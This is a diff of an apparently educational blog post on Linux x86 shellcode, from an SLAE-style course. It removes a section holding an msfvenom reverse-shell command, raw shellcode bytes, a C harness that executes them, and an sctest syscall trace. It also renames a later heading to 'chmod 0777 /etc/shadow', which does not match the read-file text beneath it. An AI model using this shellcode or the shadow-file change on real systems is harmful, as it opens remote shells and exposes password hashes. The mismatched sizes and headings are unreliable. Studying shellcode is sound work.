@@ -423,7 +423,7 @@ int main()
 }
 ```
 
-The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 37 bytes:
+The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 105 bytes:
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 revtcpshell_poly_shellcode.c -o revtcpshell_poly_final
@@ -439,56 +439,6 @@ The polymorphic version of the shellcode is ??% larger in size compared to the o
 
 
 
-
-
-:-) We almost done !
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
-No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-No Arch selected, selecting Arch: x86 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: 68 bytes
-Final size of c file: 311 bytes
-unsigned char buf[] = 
-"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
-"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
-"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
-"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
-"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
-```
-
-A C program scripted with the newly generated shellcode:
-
-```c
-/**
-* Filename: reverseshell_shellcode.c
-* Author: h3ll0clar1c3
-* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444  
-* Compilation: gcc -fno-stack-protector -z execstack -m32 reverseshell_shellcode.c -o reverseshell  
-* Usage: ./reverseshell
-* Testing: nc -lv 4444
-* Shellcode size: 26 bytes
-* Architecture: x86
-**/
-
-#include <stdio.h>
-#include <string.h>
-
-unsigned char code[] = \
-"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
-"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
-"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
-"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
-"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
-
-int main()
-{
-        printf("Shellcode length:  %d\n", strlen(code));
-        int (*ret)() = (int(*)())code;
-        ret();
-}
-```
 
 As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 26 bytes:
 
@@ -508,66 +458,7 @@ id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
 
-The Sctest tool, part of the Libemu test suite, is used to inspect the program code and analyze the system calls:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | sctest -vvv -Ss 42
-
-int socket (
-     int domain = 2;
-     int type = 1;
-     int protocol = 0;
-) =  14;
-int dup2 (
-     int oldfd = 14;
-     int newfd = 2;
-) =  2;
-int dup2 (
-     int oldfd = 14;
-     int newfd = 1;
-) =  1;
-int dup2 (
-     int oldfd = 14;
-     int newfd = 0;
-) =  0;
-int connect (
-     int sockfd = 14;
-     struct sockaddr_in * serv_addr = 0x00416fbe => 
-         struct   = {
-             short sin_family = 2;
-             unsigned short sin_port = 23569 (port=4444);
-             struct in_addr sin_addr = {
-                 unsigned long s_addr = 16777343 (host=127.0.0.1);
-             };
-             char sin_zero = "       ";
-         };
-     int addrlen = 102;
-) =  0;
-int execve (
-     const char * dateiname = 0x00416fa6 => 
-           = "//bin/sh";
-     const char * argv[] = [
-           = 0x00416f9e => 
-               = 0x00416fa6 => 
-                   = "//bin/sh";
-           = 0x00000000 => 
-             none;
-     ];
-     const char * envp[] = 0x00000000 => 
-         none;
-) =  0;
-```
-
-Sctest is used to emulate the specific instructions in the shellcode visually displaying the execution of the reverse shell payload. The parameters included in the Msfvenom payload are all visibly shown, the listening host, listening port and <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell.
-
-The required syscalls are shown:
-
-* socket
-* dup2
-* connect
-* execve
-
-#### 3rd Shellcode (linux/x86/read_file)
+#### 3rd Shellcode (chmod 0777 /etc/shadow)
 --------------
 
 The Read File payload reads a chosen file as specified, requiring 2 arguments, the file descriptor to write the output to (standard output), and the <code class="language-plaintext highlighter-rouge">PATH</code> to the file:
